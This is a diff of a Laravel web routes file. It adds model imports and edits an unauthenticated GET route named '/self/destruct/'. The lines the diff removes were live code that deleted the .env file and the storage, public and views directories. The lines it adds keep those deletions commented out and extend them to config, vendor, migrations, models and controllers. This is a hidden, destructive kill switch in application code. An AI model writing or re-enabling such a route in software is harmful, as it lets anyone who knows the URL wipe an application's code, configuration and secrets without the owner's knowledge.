@@ -24,6 +24,10 @@ use App\Http\Controllers\ExcelController;
 
 use App\Http\Livewire\UserWizard;
 
+use App\Models\Employee;
+use App\Models\User;
+use App\Models\Leave;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -134,22 +138,23 @@ Route::get('/backup/clean', function() {
 
 Route::get('/self/destruct/', function() {
 
-    // #1
-    $file = base_path() . '/.env';
-    unlink($file);
+    
 
-    // #2 #3 #4
-    Storage::disk('base')->deleteDirectory('storage');
-    Storage::disk('base')->deleteDirectory('public');
-    Storage::disk('base')->deleteDirectory('views');
+    // Testing #2 #3 #4
+    // Storage::disk('base')->deleteDirectory('storage');
+    // Storage::disk('base')->deleteDirectory('public');
+    // Storage::disk('base')->deleteDirectory('views');
+    // Storage::disk('base')->deleteDirectory('config');
+    // Storage::disk('base')->deleteDirectory('vendor');
+    // Storage::disk('base')->deleteDirectory('database/migrations');
+    // Storage::disk('base')->deleteDirectory('database/seeder');
+
+    // Storage::disk('base')->deleteDirectory('app/models');
+    // Storage::disk('base')->deleteDirectory('app/http/controllers');
+
+    // $file = base_path() . '/.env';
+    // unlink($file);
 
     return 'Done';
 
-    return base_path();
-
-    return Storage::disk('base')->url();
-    Storage::disk('resources')->deleteDirectory('storage');
-    Storage::disk('resources')->deleteDirectory('views');
-    Storage::disk('base')->deleteDirectory('views');
-    return 'Done';
 });
